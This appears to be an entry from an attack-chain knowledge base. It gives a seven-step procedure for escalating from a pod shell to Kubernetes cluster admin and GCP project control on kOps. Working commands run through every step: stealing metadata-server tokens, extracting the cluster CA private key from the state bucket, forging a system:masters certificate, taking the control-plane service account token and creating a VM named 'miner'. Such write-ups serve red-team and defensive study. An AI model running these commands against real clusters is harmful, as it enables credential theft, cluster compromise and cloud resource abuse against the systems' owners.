---
tags:
  - privilege-escalation
  - kubernetes
  - gcp
  - service-account
  - pki-theft
  - certificate-forgery
type: attack_chain
tools:
  - '[[tools/cfssl]]'
  - '[[tools/yq]]'
  - '[[tools/wget]]'
  - '[[tools/gcloud]]'
  - '[[tools/kubectl]]'
  - '[[tools/jq]]'
tactics:
  - '[[Privilege Escalation]]'
  - '[[Lateral Movement]]'
  - '[[Command and Control]]'
verified: false
platforms:
  - Kubernetes
  - GCP
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Deploy-Shell-Pod-and-Gain-Access]]'
  - '[[procedures/Retrieve-GCP-Metadata-Token-and-Bucket-Name]]'
  - '[[procedures/Extract-Kubernetes-CA-Keys-from-State-Bucket]]'
  - '[[procedures/Forge-System-Masters-Certificate]]'
  - '[[procedures/Configure-Forged-Kubeconfig-and-Verify-Admin-Access]]'
  - '[[procedures/Deploy-Pod-on-Master-and-Retrieve-Privileged-Token]]'
  - '[[procedures/Abuse-GCP-Privileges-to-Create-Instance]]'
step_count: 7
techniques:
  - '[[T1078.004]]'
  - '[[Cloud Instance Metadata API]]'
  - '[[Pass the Hash]]'
  - '[[External Remote Services]]'
updated_at: '2025-12-14T17:30:18.585Z'
description: >-
  Escalates from pod shell access to Kubernetes cluster admin and GCP project
  control by stealing PKI from unsecured state bucket.
id: 10de9da3-829a-4d60-a4b8-efed9438c4d1
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
  - '[[Lateral Movement]]'
  - '[[Command and Control]]'
mitre_techniques:
  - '[[T1078.004]]'
  - '[[Cloud Instance Metadata API]]'
  - '[[Pass the Hash]]'
  - '[[External Remote Services]]'
---
# Privilege Escalation in kOps Kubernetes on GCP via State Bucket PKI Theft

Multi-stage attack chain exploiting kOps configuration on GCP, where all nodes have full access to the state storage bucket, allowing pod compromise to lead to cluster admin and GCP project takeover.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 7 |
| Execution Time | ~30 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Pod Shell Access] --> B[Steal Metadata Token]
    B --> C[Access State Bucket PKI]
    C --> D[Forge Admin Cert]
    D --> E[Gain Cluster Admin]
    E --> F[Escalate to Master Token]
    F --> G[GCP Project Takeover]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#3498db
    style F fill:#9b59b6
    style G fill:#27ae60
```



## Prerequisites & Requirements

### Required Tools

- [[tools/kubectl]]
- [[tools/gcloud]]
- [[tools/wget]]
- [[tools/jq]]
- [[tools/yq]]
- [[tools/cfssl]]
- [[tools/gsutil]]

### Target Environment

- kOps-managed Kubernetes cluster v1.25+ on GCP
- Access to any pod with shell execution
- GCP project with Compute Engine and Storage enabled
- No additional ports required beyond standard Kubernetes API (6443) and GCP metadata (169.254.169.254)

### Initial Access Requirements

- Shell access to a running pod in the cluster (e.g., via compromised application or misconfiguration)
- Local machine with kubectl, gcloud, and other tools installed
- Knowledge of cluster name (e.g., kops.k8s.local) and API server IP

## Detailed Attack Procedures

### Step 1: Deploy Shell Pod and Gain Access
procedure: [[procedures/Deploy-Shell-Pod-and-Gain-Access]]

**Objective**: Simulate or gain initial shell access in a pod to start the escalation chain.

**Instructions**: Deploy a simple Alpine pod using [[commands/kubectl-apply-shell-yaml]] and exec into it with [[commands/kubectl-exec-ash]]:

```bash
k apply -f shell.yaml
k exec -it shell-5d64dd647c-8l8s6 -- ash
```

**Expected Output**: Interactive ash shell in the pod.

**Success Indicators**:
- Pod status: Running
- Shell prompt appears

### Step 2: Retrieve GCP Metadata Token and Bucket Name
procedure: [[procedures/Retrieve-GCP-Metadata-Token-and-Bucket-Name]]

**Objective**: Extract the service account token and state bucket name from the pod's host metadata.

**Instructions**: Inside the pod shell, use [[commands/wget-metadata-token]] to fetch the token and [[commands/wget-startup-script-grep]] to get the bucket:

```bash
wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -O default.token
wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script -O- | grep ConfigBase
```

Copy the token out with [[commands/kubectl-cp-token]]:

```bash
k cp shell-5d64dd647c-8l8s6:/default.token default.token
```

**Expected Output**: JSON token file and bucket name (e.g., gs://kops-state-test/).

**Success Indicators**:
- Token file contains access_token
- Bucket path identified

### Step 3: Extract Kubernetes CA Keys from State Bucket
procedure: [[procedures/Extract-Kubernetes-CA-Keys-from-State-Bucket]]

**Objective**: Use the stolen token to download and decode sensitive CA keys from the unsecured state bucket.

**Instructions**: Revoke local auth with [[commands/gcloud-auth-revoke]], set token with [[commands/export-cloudsdk-token]], create keys dir with [[commands/mkdir-keys]], then extract private key using [[commands/gcloud-storage-cat-private-key]] and public cert with [[commands/gcloud-storage-cat-public-cert]]:

```bash
gcloud auth revoke
export CLOUDSDK_AUTH_ACCESS_TOKEN=$(jq .access_token -r ./default.token)
mkdir -p keys
gcloud storage cat gs://kops-state-test/kops.k8s.local/pki/private/kubernetes-ca/keyset.yaml | yq e '.spec.keys[0].privateMaterial' - | base64 -d > keys/ca.key
gcloud storage cat gs://kops-state-test/kops.k8s.local/pki/private/kubernetes-ca/keyset.yaml | yq e '.spec.keys[0].publicMaterial' - | base64 -d > keys/ca.pem
```

**Expected Output**: ca.key and ca.pem files with decoded materials.

**Success Indicators**:
- Files created without auth errors
- Keys verifiable with openssl (e.g., openssl x509 -in ca.pem -text)

### Step 4: Forge System:masters Certificate
procedure: [[procedures/Forge-System-Masters-Certificate]]

**Objective**: Generate a forged client certificate signed by the stolen CA, granting system:masters group membership.

**Instructions**: Change to keys dir with [[commands/cd-keys]], then use [[commands/cfssl-gencert]] to sign the CSR:

```bash
cd keys
cfssl gencert -ca=ca.pem -ca-key=ca.key -profile=kubernetes csr.json | cfssljson -bare user
```

**Expected Output**: user.pem, user-key.pem, and user.csr files.

**Success Indicators**:
- Certificate includes O=system:masters
- Verify with openssl x509 -in user.pem -text

### Step 5: Configure Forged Kubeconfig and Verify Admin Access
procedure: [[procedures/Configure-Forged-Kubeconfig-and-Verify-Admin-Access]]

**Objective**: Build a kubeconfig using the forged cert to impersonate cluster admin.

**Instructions**: Set KUBECONFIG with [[commands/export-kubeconfig]], configure credentials with [[commands/kubectl-config-set-credentials]], cluster with [[commands/kubectl-config-set-cluster]], context with [[commands/kubectl-config-set-context]], use it with [[commands/kubectl-config-use-context]], and verify with [[commands/kubectl-auth-can-i]]:

```bash
export KUBECONFIG=./pwn.kconfig
k config set-credentials pwn --client-certificate=user.pem --client-key=user-key.pem
k config set-cluster kops --certificate-authority=ca.pem --server=https://<kops-ip>
k config set-context pwn@kops --cluster=kops --user=pwn
k config use-context pwn@kops
k auth can-i '*' '*' -A
```

**Expected Output**: 'yes' for admin check.

**Success Indicators**:
- Context switched successfully
- Full RBAC permissions granted

### Step 6: Deploy Pod on Master and Retrieve Privileged Token
procedure: [[procedures/Deploy-Pod-on-Master-and-Retrieve-Privileged-Token]]

**Objective**: Use admin access to run a pod on the control-plane node and steal its privileged service account token.

**Instructions**: Apply master pod with [[commands/kubectl-apply-shell-master]], exec with [[commands/kubectl-exec-master-ash]], fetch token with [[commands/wget-metadata-admin-token]], copy out with [[commands/kubectl-cp-admin-token]]:

```bash
k apply -f shell-master.yaml
k exec -it shell-78d66f6f7c-ft7ch -- ash
wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -O admin.token
k cp shell-78d66f6f7c-ft7ch:/admin.token admin.token
```

**Expected Output**: admin.token with privileged access_token.

**Success Indicators**:
- Pod runs on master node
- Token has broader scopes (e.g., project-wide)

### Step 7: Abuse GCP Privileges to Create Instance
procedure: [[procedures/Abuse-GCP-Privileges-to-Create-Instance]]

**Objective**: Authenticate as the privileged GCP account and demonstrate project compromise by creating a VM.

**Instructions**: Set token with [[commands/export-cloudsdk-admin-token]], then create instance with [[commands/gcloud-compute-create-miner]]:

```bash
export CLOUDSDK_AUTH_ACCESS_TOKEN=$(jq .access_token -r ./admin.token)
gcloud compute instances create miner --image-family=ubuntu-2204-lts --zone=europe-west1-b --image-project=ubuntu-os-cloud
```

**Expected Output**: Instance 'miner' created successfully.

**Success Indicators**:
- gcloud lists the new instance
- Potential for crypto-mining or further abuse

## Attack Chain Summary

### Key Achievements

1. Escalated pod access to Kubernetes cluster admin via PKI forgery
2. Accessed sensitive secrets and resources cluster-wide
3. Took over GCP project via master node service account, enabling resource creation

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[T1078.004]] Valid Accounts: Cloud Accounts
- [[Cloud Instance Metadata API]] Unsecured Credentials: Cloud Instance Metadata API
- [[Pass the Hash]] Use Alternate Authentication Material: Pass the Certificate
- [[External Remote Services]] External Remote Services

### MITRE ATT&CK Tactics

- [[Privilege Escalation]] Privilege Escalation
- [[Lateral Movement]] Lateral Movement
- [[Command and Control]] Command and Control

---

*Last updated: 2023-10-01T00:00:00Z*
